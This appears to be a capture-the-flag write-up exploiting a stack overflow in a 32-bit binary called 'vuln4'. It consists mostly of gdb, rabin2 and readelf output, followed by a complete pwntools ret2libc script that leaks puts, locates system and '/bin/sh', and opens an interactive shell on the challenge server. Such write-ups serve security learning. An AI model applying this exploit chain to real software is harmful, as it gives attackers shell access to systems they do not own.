```
gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 22
EBP+0 found at offset: 18
Registers point to pattern buffer:
[ECX] --> offset 194 - size ~5
[ESP] --> offset 26 - size ~173
[EDX] --> offset 194 - size ~5
Pattern buffer found at:
0x0804a410 : offset    0 - size  200 ([heap])
0xffffd246 : offset    0 - size  199 ($sp + -0x1a [-7 dwords])
0xffffd30e : offset  144 - size   55 ($sp + 0xae [43 dwords])
References to pattern buffer found at:
0xf7f825ac : 0x0804a410 (/lib/i386-linux-gnu/libc-2.24.so)
0xf7f825b0 : 0x0804a410 (/lib/i386-linux-gnu/libc-2.24.so)
0xf7f825b4 : 0x0804a410 (/lib/i386-linux-gnu/libc-2.24.so)
0xf7f825b8 : 0x0804a410 (/lib/i386-linux-gnu/libc-2.24.so)
0xf7f825bc : 0x0804a410 (/lib/i386-linux-gnu/libc-2.24.so)
0xffffd130 : 0x0804a410 ($sp + -0x130 [-76 dwords])
0xffffd220 : 0xffffd246 ($sp + -0x40 [-16 dwords])
0xffffd230 : 0xffffd246 ($sp + -0x30 [-12 dwords])
```

### PLT Table
```
root@kali:~/Downloads# rabin2 -i vuln4
[Imports]
ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=fflush
ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=fgets
ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=strcpy
ordinal=004 plt=0x080483a0 bind=GLOBAL type=FUNC name=puts
ordinal=005 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__
ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__libc_start_main
```
```gdb
gdb-peda$ disas 0x080483a0 
Dump of assembler code for function puts@plt:
   0x080483a0 <+0>:	jmp    DWORD PTR ds:0x8049874
   0x080483a6 <+6>:	push   0x18
   0x080483ab <+11>:	jmp    0x8048360
End of assembler dump.
gdb-peda$ x/x 0x8049874
0x8049874:	0xf7d99880
gdb-peda$ x/x 0xf7d99880
0xf7d99880 <puts>:	0x57e58955
```

```
	0xf7d3a000 0xf7eeb000   0x1b1000        0x0 /lib/i386-linux-gnu/libc-2.24.so
	0xf7eeb000 0xf7eed000     0x2000   0x1b0000 /lib/i386-linux-gnu/libc-2.24.so
	0xf7eed000 0xf7eee000     0x1000   0x1b2000 /lib/i386-linux-gnu/libc-2.24.so
```

### Relocation Table
```
root@kali:~/Downloads# rabin2 -R vuln4
[Relocations]
vaddr=0x08049858 paddr=0x00000858 type=SET_32 __gmon_start__
vaddr=0x080498a0 paddr=0x000008a0 type=SET_64
vaddr=0x080498a4 paddr=0x000008a4 type=SET_64
vaddr=0x08049868 paddr=0x00000868 type=SET_32 fflush
vaddr=0x0804986c paddr=0x0000086c type=SET_32 fgets
vaddr=0x08049870 paddr=0x00000870 type=SET_32 strcpy
vaddr=0x08049874 paddr=0x00000874 type=SET_32 puts
vaddr=0x08049878 paddr=0x00000878 type=SET_32 __libc_start_main
```

ROP Chain 1
0x080483a0 <-putsplt
0x080484ea <- main
0x08049874 <-putsgot

From this you'll leak the address of puts.  Find puts offset
```bash
root@kali:~/Downloads# readelf -s ./libc.so.6|grep puts
   205: 0005fca0   464 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.0
   434: 0005fca0   464 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.0
   509: 000ebb70  1169 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.0
   697: 000ed220   657 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
  1182: 0005e720   349 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.0
  1736: 0005e720   349 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.0
  2389: 000680e0   146 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.1
root@kali:~/Downloads# readelf -s ./libc.so.6|grep system
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
root@kali:~/Downloads# strings -a -t x ./libc.so.6 | grep /bin/sh
 15ba0b /bin/sh

```
```python
libc = output - 0x0005fca0  
system = libc + 0x0003ada0
main = 0x08049878 
binsh = libc + 0x0015ba0b
```

ROP Chain 2
system
main
"/bin/sh"

```python
from pwn import *
import struct
r = remote('ctf.sharif.edu', 4801)
#r = process('./vuln4')
first = r.recvuntil('find puts yourself')
'''
EIP+0 found at offset: 22
'''
x = 'A'*22
# ordinal=004 plt=0x080483a0 bind=GLOBAL type=FUNC name=puts
x += p32(0x080483a0)
# disas main
x += p32(0x080484ea)
# vaddr=0x08049874 paddr=0x00000874 type=SET_32 puts
x += p32(0x08049874)
x += '\n'
r.send(x)
r.recv(1024)
libc_puts =  struct.unpack("I",r.recv()[:4].strip().ljust(4, '\x00'))[0]

# Build offsets to build ROP chain
libc = libc_puts - 0x0005fca0  
system = libc + 0x0003ada0
binsh = libc + 0x0015ba0b

# Send new ROP chain
x = 'A'*22
x += p32(system)
x += p32(0x080484ea)
x += p32(binsh)
x += '\n'

r.send(x)
r.interactive()
```
